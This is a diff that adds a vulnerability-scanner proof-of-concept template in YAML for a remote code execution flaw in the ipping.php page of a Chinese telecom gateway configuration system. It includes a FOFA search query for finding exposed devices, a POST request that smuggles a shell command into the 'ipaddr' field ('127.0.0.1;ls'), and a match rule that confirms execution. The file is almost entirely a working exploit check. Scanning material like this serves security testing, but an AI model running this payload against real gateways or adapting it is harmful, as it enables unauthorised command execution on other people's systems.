@@ -1,0 +1,19 @@
+id: poc-yaml-Telecom-gateway-ipping-php-rce
+info:
+  name: 电信网关配置管理系统 ipping.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 电信网关配置管理系统
+  fofa: body="img/login_bg3.png" && body="系统登录"
+requests:
+- method: POST
+  path: /manager/ipping.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ipaddr=127.0.0.1;ls
+  expression: "status_code == 200 && \ncontains(body,\"64 bytes from 127.0.0.1\")\
+    \ &&\ncontains(body,\"config\") &&\ncontains(body,\".php\")\n"
+variables: {}
+transport: http
